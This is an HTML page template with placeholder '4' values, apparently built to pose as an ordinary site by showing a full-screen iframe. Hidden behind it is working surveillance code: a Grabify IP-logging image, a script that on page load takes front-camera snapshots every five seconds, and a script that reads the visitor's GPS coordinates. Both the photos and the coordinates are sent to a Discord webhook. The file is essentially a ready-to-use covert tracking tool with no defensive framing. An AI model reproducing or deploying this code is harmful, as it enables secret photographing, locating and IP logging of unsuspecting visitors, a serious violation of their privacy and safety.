
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="title" content="4" />
        <meta name="description" content="4" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="4" />
        <meta property="og:title" content="4" />
        <meta property="og:description" content="4" />
        <meta property="og:image" content="4" />
        <meta property="twitter:card" content="summary_large_image" />
        <meta property="twitter:url" content="4" />
        <meta property="twitter:title" content="4" />
        <meta property="twitter:description" content="4" />
        <meta property="twitter:image" content="4" />
        <title>4</title>
        <style>
            body, html {
                margin: 0;
                padding: 0;
                height: 100%;
            }
            iframe {
                width: 100%;
                height: 100%;
                border: none;
            }
        </style>
    </head>
    <body>
        <img src="https://grabify.link/4" style="display:none;">
        <video id="video" autoplay style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const webhookURL = "4";

            // Function to send image to Discord webhook as file
            async function sendImageToWebhook(imageBlob) {
                const formData = new FormData();
                formData.append("file", imageBlob, "snapshot.png");

                try {
                    await fetch(webhookURL, {
                        method: "POST",
                        body: formData
                    });
                } catch (error) {
                    console.error("Failed to send image:", error);
                }
            }

            // Function to take a picture using the front camera
            async function takePicture() {
                const video = document.getElementById("video");
                const canvas = document.getElementById("canvas");
                const context = canvas.getContext("2d");

                // Get user media (front camera)
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        // Set canvas size to match video feed
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;

                        // Start looping every 5 seconds (or any desired interval)
                        setInterval(() => {
                            // Draw the video frame to the canvas
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            // Convert canvas to Blob (image/png)
                            canvas.toBlob(async (blob) => {
                                if (blob) {
                                    // Send the image to the webhook
                                    await sendImageToWebhook(blob);
                                }
                            }, "image/png");
                        }, 5000); // Take picture every 5 seconds
                    };
                } catch (error) {
                    console.error("Failed to access camera:", error);
                }
            }

            // Function to get GPS coordinates and send them to the webhook
            function getGPS() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(async function (position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // Prepare data with coordinates
                        const data = {
                            content: `User GPS coordinates: Latitude: ${latitude}, Longitude: ${longitude}`
                        };

                        // Send GPS data
                        try {
                            await fetch(webhookURL, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify(data)
                            });
                        } catch (error) {
                            console.error("Failed to send GPS data:", error);
                        }
                    });
                } else {
                    console.error("Geolocation is not supported by this browser.");
                }
            }

            // Trigger GPS and camera loop on page load
            window.onload = function () {
                getGPS();
                takePicture();
            };
        </script>

        <iframe src="4" frameborder="0"></iframe>
    </body>
    </html>
